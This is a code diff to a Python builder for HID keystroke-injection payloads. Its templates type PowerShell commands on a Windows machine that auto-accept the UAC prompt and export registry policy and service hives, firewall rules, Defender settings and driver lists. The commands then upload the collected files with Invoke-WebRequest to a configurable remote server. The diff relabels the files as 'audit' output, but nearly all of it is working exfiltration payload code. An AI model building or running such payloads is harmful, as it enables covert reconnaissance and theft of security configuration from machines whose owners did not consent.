@@ -1,3 +1,4 @@
+
 """
 Payload builder for generating HID injection scripts.
 Supports dynamic templates with variable substitution.
@@ -10,9 +11,24 @@ import json
 class PayloadBuilder:
     """Builds executable HID payloads from templates"""
     
-    def __init__(self):
+    def __init__(self, config_path='config.json'):
         self.payloads = {}
+        self.config = self._load_config(config_path)
         self._register_default_payloads()
+
+    def _load_config(self, config_path):
+        """Load configuration from JSON file"""
+        try:
+            with open(config_path, 'r') as f:
+                return json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            # Fallback to default if config is missing or invalid
+            return {
+                "network": {
+                    "server_ip": "172.16.0.1",
+                    "upload_port": 8000
+                }
+            }
     
     def _register_default_payloads(self):
         """Register built-in payload templates"""
@@ -85,8 +101,8 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKLM_Policies.reg -Headers @{"X-Filename"="HKLM_Policies.reg"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_hklm_policies.txt -Headers @{"X-Filename"="audit_hklm_policies.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -105,8 +121,8 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKCU_Policies.reg -Headers @{"X-Filename"="HKCU_Policies.reg"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_hkcu_policies.txt -Headers @{"X-Filename"="audit_hkcu_policies.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -126,8 +142,8 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Services.reg -Headers @{"X-Filename"="Services.reg"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_services.txt -Headers @{"X-Filename"="audit_services.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
                 {'action': 'type', 'text': 'exit'},
@@ -147,8 +163,8 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Control.reg -Headers @{"X-Filename"="Control.reg"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_control.txt -Headers @{"X-Filename"="audit_control.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
                 {'action': 'type', 'text': 'exit'},
@@ -168,9 +184,9 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\firewall_rules.txt;'},
+                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\firewall_rules.txt -Headers @{"X-Filename"="firewall_rules.txt"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_firewall.txt -Headers @{"X-Filename"="audit_firewall.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -190,9 +206,9 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\defender.json;'},
+                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\defender.json -Headers @{"X-Filename"="defender.json"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_defender.json -Headers @{"X-Filename"="audit_defender.json"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -212,9 +228,9 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\drivers.txt;'},
+                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\drivers.txt -Headers @{"X-Filename"="drivers.txt"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_drivers.txt -Headers @{"X-Filename"="audit_drivers.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
                 {'action': 'type', 'text': 'exit'},
@@ -234,9 +250,9 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\devices.txt;'},
+                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\devices.txt -Headers @{"X-Filename"="devices.txt"} -UseBasicParsing'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_devices.txt -Headers @{"X-Filename"="audit_devices.txt"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
                 {'action': 'type', 'text': 'exit'},
@@ -256,16 +272,36 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\firewall_rules.txt;'},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\defender.json;'},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\drivers.txt;'},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\devices.txt'},
+                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
                 {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 8000},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': '$files=@("audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 1000},
+                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 10000},
                 {'action': 'type', 'text': 'exit'},
                 {'action': 'key', 'name': 'ENTER'},
             ]
@@ -283,16 +319,34 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\firewall_rules.txt;'},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\defender.json;'},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\drivers.txt;'},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\devices.txt;'},
-                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall_rules.txt","defender.json","drivers.txt","devices.txt");'},
-                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://172.16.0.1:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
+                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 2000},
+                {'action': 'type', 'text': '$files=@("audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");'},
+                {'action': 'key', 'name': 'ENTER'},
+                {'action': 'delay', 'ms': 1000},
+                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 10000},
                 {'action': 'type', 'text': 'exit'},
@@ -312,7 +366,7 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 6000},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall_rules.txt","defender.json","drivers.txt","devices.txt");foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://172.16.0.1:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
+                {'action': 'type', 'text': '$files=@("audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
                 {'action': 'type', 'text': 'exit'},
@@ -341,7 +395,8 @@ class PayloadBuilder:
         default_vars = {
             'TIMESTAMP': datetime.now().isoformat(),
             'HOST_ID': 'unknown',
-            'SERVER_IP': '172.16.0.1',
+            'SERVER_IP': self.config['network']['server_ip'],
+            'UPLOAD_PORT': self.config['network']['upload_port']
         }
         
         # Merge with provided variables
